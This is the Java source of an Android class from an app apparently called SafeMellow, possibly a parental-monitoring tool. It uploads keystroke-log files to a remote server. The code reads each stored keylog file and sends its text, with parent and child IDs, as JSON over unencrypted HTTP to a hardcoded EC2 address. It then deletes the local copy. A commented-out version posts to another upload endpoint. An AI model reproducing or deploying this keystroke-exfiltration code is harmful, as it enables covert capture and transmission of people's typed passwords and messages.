package lk.parinda.safemellow.keylog;

import android.content.Context;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

import lk.parinda.safemellow.LoginActivity;
import lk.parinda.safemellow.MySingleton;
import lk.parinda.safemellow.SharedPreferencesManager;
import lk.parinda.safemellow.db_controll.DownloadFileDBC;

public class KeyLogUplodController {

    private Context context;
    public static boolean isUploading = false;

    public KeyLogUplodController(Context context) {
        this.context = context;
    }

    public void startUpload(){
        Log.e("keyloger","upload");
        if(!isUploading){
            Log.e("keyloger","upload"+isUploading);
            String[] list = new SharedPreferencesManager(context).readFileNames().split(",");
            Log.e("keyloger","upload"+ Arrays.toString(list));
            ArrayList<String> list2 = new ArrayList<>(Arrays.asList(list));
            uploadFile(list2);
        }
    }

    private void uploadFile(ArrayList<String> list){
        isUploading=true;
        if(list.size()>0) {
            File file = new File(context.getExternalFilesDir(null), list.get(0));;
            if (file.exists()) {
                String text = readFile(file);

//                Log.e("keyloger","upload text "+text);
//                Log.e("keyloger","upload url "+"http://"+SharedPreferencesManager.ipAddress+"/safemellow/upload.php");
//                StringRequest stringRequest = new StringRequest(Request.Method.POST, "http://"+SharedPreferencesManager.ipAddress+"/safemellow/upload.php",
//                        new Response.Listener<String>() {
//                            @Override
//                            public void onResponse(String response) {
//                                System.out.println("response "+response);
//                                try {
//                                    file.delete();
//                                }catch (Exception e){
//                                    Log.e("err",e.getMessage());
//                                }
//                                new SharedPreferencesManager(context).removeFile(list.get(0));
//                                list.remove(0);
//                                uploadFile(list);
//                            }
//                        },
//                        new Response.ErrorListener() {
//                            @Override
//                            public void onErrorResponse(VolleyError error) {
//                                System.out.println("error "+error.getMessage());
//                                System.out.println("error "+error.getLocalizedMessage());
//                                list.remove(0);
//                                uploadFile(list);
//                            }
//                        }) {
//                    @Override
//                    protected Map<String, String> getParams() {
//                        Map<String, String> params = new HashMap<String, String>();
//                        params.put("txt", text);
//                        return params;
//                    }
//
//                };
//                MySingleton.getInstance(context).addToRequestQueue(stringRequest);

                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("text",text);
                    jsonObject.put("pId", LoginActivity.pid);
                    jsonObject.put("cId",LoginActivity.cid);
                    Log.e("ooo", jsonObject.toString());
                    String url = "http://ec2-54-245-147-254.us-west-2.compute.amazonaws.com:4000/user/words";
                    JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, jsonObject,
                            response -> {
                                if (response != null) {
                                    Toast.makeText(context, "Precess Success", Toast.LENGTH_LONG).show();
                                }
                                try {
                                    file.delete();
                                }catch (Exception e){
                                    Log.e("err",e.getMessage());
                                }
                                new SharedPreferencesManager(context).removeFile(list.get(0));
                                list.remove(0);
                                uploadFile(list);
                            },
                            e -> {
                                System.err.println(e.getMessage());
                                System.out.println("error "+e.getMessage());
                                System.out.println("error "+e.getLocalizedMessage());
                                try {
                                    file.delete();
                                }catch (Exception e2){
                                    Log.e("err",e2.getMessage());
                                }
                                new SharedPreferencesManager(context).removeFile(list.get(0));
                                list.remove(0);
                                uploadFile(list);
                            }
                    );
                    MySingleton.getInstance(context).addToRequestQueue(jsonObjectRequest);
                }catch (Exception e){
                    e.printStackTrace();
                }

            }else{
                new SharedPreferencesManager(context).removeFile(list.get(0));
                list.remove(0);
                uploadFile(list);
            }
        }else{
            isUploading=false;
        }
    }

    private String readFile(File file){
        StringBuilder text = new StringBuilder();

        try {
            BufferedReader br = new BufferedReader(new FileReader(file));
            String line;

            while ((line = br.readLine()) != null) {
                text.append(line);
                text.append('\n');
            }
            br.close();
        }
        catch (IOException e) {
            System.out.println("file read error");
            System.out.println(e.getMessage());
        }
        return text.toString();
    }

}
